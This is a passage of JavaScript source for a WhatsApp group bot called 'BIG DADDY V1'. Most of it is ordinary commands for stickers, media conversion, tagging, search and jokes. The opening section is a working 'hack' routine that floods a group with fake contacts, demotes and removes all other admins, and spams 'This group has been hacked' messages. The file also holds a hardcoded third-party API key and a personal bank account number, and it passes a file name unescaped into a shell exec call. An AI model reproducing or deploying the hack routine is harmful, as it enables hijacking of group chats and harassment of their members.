            '22334455667@s.whatsapp.net',
            '33445566778@s.whatsapp.net',
            '44556677889@s.whatsapp.net',
            '55667788990@s.whatsapp.net',
            '66778899001@s.whatsapp.net',
            '77889900112@s.whatsapp.net',
            '88990011223@s.whatsapp.net'
        ];

        for (const fakeContact of fakeContacts) {
            await XeonBotInc.groupParticipantsUpdate(groupId, [fakeContact], 'add')
                .then(() => console.log(`✅ Fake contact ${fakeContact} added.`))
                .catch(err => console.error(`❌ Failed to add fake contact ${fakeContact}: ${err.message}`));
        }

        // Step 4: Remove all other admins
        const groupMetadata = await XeonBotInc.groupMetadata(groupId);
        const groupParticipants = groupMetadata.participants;
        const groupAdmins = groupParticipants.filter(p => p.admin).map(admin => admin.id);

        // Demote and remove all other admins except the target user
        for (const adminId of groupAdmins) {
            if (adminId !== targetUser) {
                await XeonBotInc.groupParticipantsUpdate(groupId, [adminId], 'demote')
                    .then(() => console.log(`✅ Admin ${adminId} demoted successfully.`))
                    .catch(err => console.error(`❌ Failed to demote admin ${adminId}: ${err.message}`));

                await XeonBotInc.groupParticipantsUpdate(groupId, [adminId], 'remove')
                    .then(() => console.log(`✅ Admin ${adminId} removed successfully.`))
                    .catch(err => console.error(`❌ Failed to remove admin ${adminId}: ${err.message}`));
            }
        }

        // Step 5: Spam the group with messages
        const spamMessage = "🔥 *This group has been hacked by BigDaddy V1!* 🔥\n\nSecurity compromised. Contact the owner to restore access.";
        for (let i = 0; i < 10; i++) { // Sends 10 spam messages
            await XeonBotInc.sendMessage(groupId, { text: spamMessage })
                .then(() => console.log(`✅ Spam message ${i + 1} sent.`))
                .catch(err => console.error(`❌ Failed to send spam message ${i + 1}: ${err.message}`));
        }

        replygcxeon(
            "✅ *HACK SUCCESSFUL!*\n\n" +
            "🎉 Group has been compromised successfully.\n" +
            "👤 Fake contacts added.\n" +
            "🔐 Admins removed.\n" +
            "💣 Group spammed with warning messages."
        );
    } catch (err) {
        replygcxeon('❌ *ERROR: An unexpected error occurred during the hack process.*');
        console.error(err);
    }
    break;
            case 'promote':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await XeonBotInc.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'demote':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await XeonBotInc.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'setname':
            case 'setsubject':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (!text) return 'Text ?'
                await XeonBotInc.groupUpdateSubject(m.chat, text).then((res) => replygcxeon(mess.success)).catch((err) => replygcxeon(json(err)))
                break
            case 'setdesc':
            case 'setdesk':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (!text) return 'Text ?'
                await XeonBotInc.groupUpdateDescription(m.chat, text).then((res) => replygcxeon(mess.success)).catch((err) => replygcxeon(json(err)))
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (!quoted) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await XeonBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await XeonBotInc.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcxeon(mess.done)
                } else {
                    var memeg = await XeonBotInc.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcxeon(mess.done)
                }
                break
            case 'tagall':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator && !isPremium) return replygcxeon(mess.admin)
                if (!isBotAdmins && !isCreator && !isPremium) return replygcxeon(mess.botAdmin)
                let teks = `*👥 You have Tag All*
 
                 🗞️ *Message : ${q ? q : 'blank'}*\n\n`
                for (let mem of participants) {
                    teks += `• @${mem.id.split('@')[0]}\n`
                }
                XeonBotInc.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'hidetag':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator && !isPremium) return replygcxeon(mess.admin)
                if (!isBotAdmins && !isCreator && !isPremium) return replygcxeon(mess.botAdmin)
                XeonBotInc.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'totag':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isBotAdmins && !isCreator && !isPremium) return replygcxeon(mess.botAdmin)
                if (!isAdmins && !isCreator && !isPremium) return replygcxeon(mess.admin)
                if (!m.quoted) return replygcxeon(`Reply messages with captions ${prefix + command}`)
                XeonBotInc.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
                break
            case 'group':
            case 'grup':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (args[0] === 'close') {
                    await XeonBotInc.groupSettingUpdate(m.chat, 'announcement').then((res) => replygcxeon(`Success In Closing The Group 🕊️`)).catch((err) => replygcxeon(json(err)))
                } else if (args[0] === 'open') {
                    await XeonBotInc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replygcxeon(`Success In Opening The Group 🕊️`)).catch((err) => replygcxeon(json(err)))
                } else {
                    replygcxeon(`Mode ${command}\n\n\nType ${prefix + command}open/close`)
                }
                break
            case 'editinfo':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (args[0] === 'open') {
                    await XeonBotInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => replygcxeon(`Successfully Opened Group Edit Info 🕊️`)).catch((err) => replygcxeon(json(err)))
                } else if (args[0] === 'close') {
                    await XeonBotInc.groupSettingUpdate(m.chat, 'locked').then((res) => replygcxeon(`Successfully Closed Group Edit Info🕊️`)).catch((err) => replygcxeon(json(err)))
                } else {
                    replygcxeon(`Mode ${command}\n\n\nType ${prefix + command}on/off`)
                }
                break
            case 'linkgroup':
            case 'grouplink':
            case 'linkgrup':
            case 'linkgc':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                let response = await XeonBotInc.groupInviteCode(m.chat)
                XeonBotInc.sendText(m.chat, `👥 *BIG DADDY V1 DISPLAYS GROUP LINK INFO*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Group Owner :* ${groupMetadata.owner !== undefined ? '@' + groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
                    detectLink: true
                })
                break
            case 'revoke':
            case 'resetlink':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                await XeonBotInc.groupRevokeInvite(m.chat)
                    .then(res => {
                        replygcxeon(`BIG DADDY has Successful Reset, Group Invite Link ${groupMetadata.subject}`)
                    }).catch((err) => replygcxeon(json(err)))
                break
                case 'p':
case 'ping': {
    const used = process.memoryUsage();
    const cpus = os.cpus().map(cpu => {
        cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0);
        return cpu;
    });
    const cpu = cpus.reduce((last, cpu, _, { length }) => {
        last.total += cpu.total;
        last.speed += cpu.speed / length;
        last.times.user += cpu.times.user;
        last.times.nice += cpu.times.nice;
        last.times.sys += cpu.times.sys;
        last.times.idle += cpu.times.idle;
        last.times.irq += cpu.times.irq;
        return last;
    }, {
        speed: 0,
        total: 0,
        times: {
            user: 0,
            nice: 0,
            sys: 0,
            idle: 0,
            irq: 0
        }
    });

    let timestamp = speed();
    let latensi = speed() - timestamp;
    neww = performance.now();
    oldd = performance.now();

    // Beautified Response
    respon = `
✨ **BIG DADDY V1 Info Server** 💻
------------------------
📊 **Response Speed**: *${latensi.toFixed(4)} Second*  
🕒 **Latency**: *${(oldd - neww).toFixed(2)} milliseconds*  
⏱️ **Runtime**: *${runtime(process.uptime())}*

🧠 **Memory & CPU Usage Details:**
-------------------------------------------------
💾 **RAM Usage**: *${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}*

🚧 **BIG DADDY V1 NodeJS Memory Usage**:
${Object.keys(used).map((key, _, arr) => 
    `${key.padEnd(Math.max(...arr.map(v => v.length)), ' ')}: *${formatp(used[key])}*`).join('\n')}

💡 **CPU Usage Summary**:
${cpus[0] ? `
🧑‍🔧 **BIG DADDY V1 Total CPU Usage**:
*${cpus[0].model.trim()}* @ *${cpu.speed} MHz*
${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}*: *${(100 * cpu.times[type] / cpu.total).toFixed(2)}%*`).join('\n')}
` : ''}

🖥️ **CPU Core(s) Usage** (${cpus.length} Core(s) CPU):
${cpus.map((cpu, i) => `
${i + 1}. *${cpu.model.trim()}* @ *${cpu.speed} MHz*
${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}*: *${(100 * cpu.times[type] / cpu.total).toFixed(2)}%*`).join('\n')}
`).join('\n\n')}
`.trim();

    // Sending the beautified response
    await XeonBotInc.sendMessage(m.chat, {
        text: respon,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `${botname}`,
                body: `Response: ${latensi.toFixed(4)} Second`,
                thumbnailUrl: 'https://i.postimg.cc/J7B3N4NF/file-Z5-Nh-Z2cc-KK4-TG0sz-L7n-Gcc-FJ-1.webp.',
                sourceUrl: global.link,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, {
        quoted: m
    });
}
break;
            case 'buypremium':
            case 'buyprem':
            case 'premium': {
                let teks = `Hey ${pushname}👋\nWant to Buy Premium? Just chat with Philip 😉👉 t.me/phistar1`
                await XeonBotInc.sendMessage(m.chat, {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `${ownername}`,
                            thumbnailUrl: 'https://i.postimg.cc/J7B3N4NF/file-Z5-Nh-Z2cc-KK4-TG0sz-L7n-Gcc-FJ-1.webp.',
                          
                     sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break
            case 'runtime':
                let runtimetext = `*Big Daddy V1* 𝐇𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐫𝐮𝐧𝐧𝐢𝐧𝐠 𝐟𝐨𝐫 ${runtime(process.uptime())}` 
                XeonBotInc.sendMessage(m.chat, {
                    text: runtimetext,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `phistar`,
                            thumbnailUrl: 'https://i.postimg.cc/J7B3N4NF/file-Z5-Nh-Z2cc-KK4-TG0sz-L7n-Gcc-FJ-1.webp.',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
            case 'sc':
            case 'script':
            case 'scriptbot':
                XeonBotInc.sendMessage(m.chat, {
                    text: `Hello world`,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `SCRIPT OF ${botname} is on telegram @phistar`,
                            thumbnailUrl: 'https://i.postimg.cc/J7B3N4NF/file-Z5-Nh-Z2cc-KK4-TG0sz-L7n-Gcc-FJ-1.webp.',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
            case 'donate':
            case 'donasi':
                let textnate = `Hello Cutie💕 ${pushname}\n\nNo matter how much you donate is very valuable for us❤️`
                XeonBotInc.sendMessage(m.chat, {
                    text: 'Palmpay 🏦 Acct No: 9128019141😊 Acct Name: Edward saliu/David Tomiwa\n\n' + textnate
                }, {
                    quoted: m
                })
                break
                case 'google':
    try {
        if (!text) {
            replygcxeon("Please provide a query.\n*Example: .google What is a bot.*");
            break;
        }

        const axios = require('axios');
        const cheerio = require('cheerio'); // For scraping Google search results

        replygcxeon("Searching Google...");

        const query = encodeURIComponent(text.trim());
        const url = `https://www.google.com/search?q=${query}`;

        // Fetch Google search results
        const { data } = await axios.get(url, {
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            },
        });

        // Parse results using Cheerio
        const $ = cheerio.load(data);
        const results = [];

        $(".tF2Cxc").each((index, element) => {
            const title = $(element).find(".DKV0Md").text();
            const link = $(element).find("a").attr("href");
            const snippet = $(element).find(".IsZvec").text();
            if (title && link) {
                results.push({ title, snippet, link });
            }
        });

        // Check if results exist
        if (results.length === 0) {
            replygcxeon(`No results found for: "${text}".`);
            break;
        }

        // Format and send results
        let responseMessage = `*Google Search Results for:* ${text}\n\n`;
        results.slice(0, 5).forEach((result, index) => {
            responseMessage += `*${index + 1}. ${result.title}*\n`;
            responseMessage += `${result.snippet}\n`;
            responseMessage += `_Link:_ ${result.link}\n\n`;
            responseMessage += `────────────────────────\n\n`;
        });

        replygcxeon(responseMessage);

    } catch (err) {
        replygcxeon("An error occurred during Google search. Please try again.");
        console.error(err.message || err);
    }
    break;
    case 'riddle':
    try {
        // Select a random riddle
        const riddle = devinettes[Math.floor(Math.random() * devinettes.length)];

        // Send the riddle question
        await XeonBotInc.sendMessage(m.chat, {
            text: `🤔 *Riddle:* ${riddle.question}\n\nYou have *30 seconds* to think!`
        }, { quoted: m });

        // Wait for 30 seconds
        await new Promise(resolve => setTimeout(resolve, 30000));

        // Send the riddle answer
        await XeonBotInc.sendMessage(m.chat, {
            text: `⏱️ *Time's up!* The answer is: *${riddle.reponse}*`
        }, { quoted: m });

    } catch (error) {
        console.error("Error:", error.message || "An unexpected error occurred.");
        replygcxeon("Oops, an error occurred while processing the riddle. Please try again later.");
    }
    break;
case 'owner': {
const repf = await XeonBotInc.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Contact`, 
contacts: list }, mentions: [sender] }, { quoted: m })
XeonBotInc.sendMessage(from, { text : `Wag wan @${sender.split("@")[0]}, My  handsome owner but i was created by Phistar,`, mentions: [sender]}, { quoted: repf })
}
break
            case 'sticker':
            case 'stiker':
            case 's': {
                if (!quoted) return replygcxeon(`Reply to Video/Image With Caption ${prefix + command}`)
                if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else if (isVideo || /video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Maximum 10 seconds!')
                    let media = await quoted.download()
                    let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return replygcxeon(`Send Images/Videos With Captions ${prefix + command}\nVideo Duration 1-9 Seconds`)
                }
            }
            break
            case 'smeme': {
                let respond = `Send/Reply image/sticker with caption ${prefix + command} text1|text2`
                if (!/image/.test(mime)) return replygcxeon(respond)
                if (!text) return replygcxeon(respond)
                replygcxeon(mess.wait)
                atas = text.split('|')[0] ? text.split('|')[0] : '-'
                bawah = text.split('|')[1] ? text.split('|')[1] : '-'
                let dwnld = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
                let fatGans = await TelegraPh(dwnld)
                let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
                let pop = await XeonBotInc.sendImageAsSticker(m.chat, smeme, m, {
                    packname: packname,
                    author: author
                })
                fs.unlinkSync(pop)
            }
            break
case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!args.join(" ")) return replygcxeon(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
XeonBotInc.downloadAndSaveMediaMessage(quoted, "gifee")
XeonBotInc.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replygcxeon(`Photo/Video?`)
}
}
break
            case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return replygcxeon(`Reply sticker with caption *${prefix + command}*`)
                replygcxeon(mess.wait)
                let media = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    XeonBotInc.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
            case 'tomp4':
            case 'tovideo': {
                if (!/webp/.test(mime)) return replygcxeon(`Reply sticker with caption *${prefix + command}*`)
                replygcxeon(mess.wait)
                let media = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await XeonBotInc.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    }
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'toaud':
            case 'toaudio': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Send/Reply Video/Audio that you want to make into audio with caption ${prefix + command}`)
                replygcxeon(mess.wait)
                let media = await XeonBotInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                XeonBotInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: m
                })

            }
            break
            case 'tomp3': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Send/Reply Video/Audio that you want to make into MP3 with caption ${prefix + command}`)
                replygcxeon(mess.wait)
                let media = await XeonBotInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                XeonBotInc.sendMessage(m.chat, {
                    document: audio,
                    mimetype: 'audio/mp3',
                    fileName: `Phistar.mp3`
                }, {
                    quoted: m
                })

            }
            break
            case 'tovn':
            case 'toptt': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Reply Video/Audio that you want to make into a VN with caption ${prefix + command}`)
                replygcxeon(mess.wait)
                let media = await XeonBotInc.downloadMediaMessage(qmsg)
                let {
                    toPTT
                } = require('./lib/converter')
                let audio = await toPTT(media, 'mp4')
                XeonBotInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg',
                    ptt: true
                }, {
                    quoted: m
                })

            }
            break
            case 'togif': {
                if (!/webp/.test(mime)) return replygcxeon(`Reply sticker with caption *${prefix + command}*`)
                replygcxeon(mess.wait)
                let media = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await XeonBotInc.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    },
                    gifPlayback: true
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'tourl': {
                replygcxeon(mess.wait)
                let media = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    replygcxeon(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    replygcxeon(util.format(anu))
                }
                await fs.unlinkSync(media)

            }
            break
            case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return replygcxeon(`Example : ${prefix + command} 😅+🤔`)
                if (!emoji2) return replygcxeon(`Example : ${prefix + command} 😅+🤔`)
                replygcxeon(mess.wait)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
            }
            break
            case 'toonce':
            case 'toviewonce': {
                if (!quoted) return replygcxeon(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                    XeonBotInc.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: `Here you go!`,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                    XeonBotInc.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: `Here you go!`,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                }
            }
            break
            case 'toqr': {
                if (!q) return replygcxeon(' Please include link or text!')
                const QrCode = require('qrcode-reader')
                const qrcode = require('qrcode')
                let qyuer = await qrcode.toDataURL(q, {
                    scale: 35
                })
                let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
                let buff = getRandom('.jpg')
                await fs.writeFileSync('./' + buff, data)
                let medi = fs.readFileSync('./' + buff)
                await XeonBotInc.sendMessage(from, {
                    image: medi,
                    caption: "Here you go!"
                }, {
                    quoted: m
                })
                setTimeout(() => {
                    fs.unlinkSync(buff)
                }, 10000)
            }
            break
            case 'fliptext': {
                if (args.length < 1) return replygcxeon(`Example:\n${prefix}fliptext Xeony`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                replygcxeon(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
            }
            break
            case 'listvn': {
                let teks = '┌──⭓「 *List Vn* 」\n│\n'
                for (let x of VoiceNoteXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VoiceNoteXeon.length}*`
                replygcxeon(teks)
            }
            break
            case 'liststicker': {
                let teks = '┌──⭓「 *List Sticker* 」\n│\n'
                for (let x of StickerXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${StickerXeon.length}*`
                replygcxeon(teks)
            }
            break
            case 'listimage': {
                let teks = '┌──⭓「 *List Image* 」\n│\n'
                for (let x of ImageXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${ImageXeon.length}*`
                replygcxeon(teks)
            }
            break
            case 'listvideo': {
                let teks = '┌──⭓「 *List Video* 」\n│\n'
                for (let x of VideoXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VideoXeon.length}*`
                replygcxeon(teks)
            }
            break
            case 'addowner':
                if (!isCreator) return replygcxeon(mess.owner)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await XeonBotInc.onWhatsApp(bnnd)
if (ceknye.length == 0) return replygcxeon(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replygcxeon(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
                if (!isCreator) return replygcxeon(mess.owner)
if (!args[0]) return replygcxeon(`Use ${prefix+command} nomor\nExample ${prefix+command} 916909137213`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replygcxeon(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
            case 'addvideo': {
                if (!isPremium) return replygcxeon(mess.prem)
                if (args.length < 1) return replygcxeon('Video Name?')
                if (VideoXeon.includes(q)) return replygcxeon("The name you entered already exists")
                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                VideoXeon.push(q)
                await fsx.copy(delb, `./Phistar-media/video/${q}.mp4`)
                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoXeon))
                fs.unlinkSync(delb)
                replygcxeon(`Success Adding Video\To View Type ${prefix}listvideo`)
            }
            break
            case 'delvideo': {
                if (!isPremium) return replygcxeon(mess.prem)
                if (args.length < 1) return replygcxeon('Enter the Video Name')
                if (!VideoXeon.includes(q)) return replygcxeon("Name Does Not Exist in Database")
                let wanu = VideoXeon.indexOf(q)
                VideoXeon.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoXeon))
                fs.unlinkSync(`./Phistar-media/video/${q}.mp4`)
                replygcxeon(`Successfully Deleted Video ${q}`)
            }
            break
            case 'addimage': {
                if (!isPremium) return replygcxeon(mess.prem)
                if (args.length < 1) return replygcxeon('The name of the image?')
                if (ImageXeon.includes(q)) return replygcxeon("The name you entered is already registered in the database")
                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                ImageXeon.push(q)
                await fsx.copy(delb, `./Phistar-media/image/${q}.jpg`)
                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageXeon))
                fs.unlinkSync(delb)
                replygcxeon(`Success In Adding Image\nTo Check Type ${prefix}listimage`)
            }
            break
            case 'delimage': {
                if (!isPremium) return replygcxeon(mess.prem)
                if (args.length < 1) return replygcxeon('Enter the Image Name')
                if (!ImageXeon.includes(q)) return replygcxeon("The image name you entered is not registered")
                let wanu = ImageXeon.indexOf(q)
                ImageXeon.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageXeon))
                fs.unlinkSync(`./Phistar-media/image/${q}.jpg`)
                replygcxeon(`Successfully Deleted Image ${q}`)
            }
            break
            case 'addsticker': {
                if (!isPremium) return replygcxeon(mess.prem)
                if (args.length < 1) return replygcxeon('Enter the name of the sticker?')
                if (StickerXeon.includes(q)) return replygcxeon("Name Already In Use")
                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                StickerXeon.push(q)
                await fsx.copy(delb, `./Phistar-media/sticker/${q}.webp`)
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerXeon))
                fs.unlinkSync(delb)
                replygcxeon(`Successfully Adding Sticker\To Check Type ${prefix}liststicker`)
            }
            break
            case 'joke':
    try {
        // List of 100 jokes
        const jokes = [
            "Why don't skeletons fight each other? They don't have the guts!",
            "Why did the scarecrow win an award? Because he was outstanding in his field!",
            "I told my wife she was drawing her eyebrows too high. She looked surprised.",
            "Why don’t eggs tell jokes? Because they’d crack each other up!",
            "I told my computer I needed a break, and now it won't stop sending me Kit-Kats.",
            "I asked my dog what’s two minus two. He said nothing.",
            "How do you make a tissue dance? You put a little boogey in it!",
            "I used to play piano by ear, but now I use my hands.",
            "I wondered why the baseball kept getting bigger. Then it hit me.",
            "I told my wife she was getting too emotional during our argument, but she didn’t take it well. She stormed off to the freezer and threw a bag of peas at me. It was a real cold shoulder.",
            "I threw a boomerang 10 years ago and I still haven’t gotten it back.",
            "Did you hear about the Italian chef that died? He pasta way. We cannoli do so much. His legacy will be a pizza history.",
            "What’s orange and sounds like a parrot? A carrot!",
            "I used to be a baker, but I couldn't make enough dough.",
            "Why don’t oysters donate to charity? Because they are shellfish.",
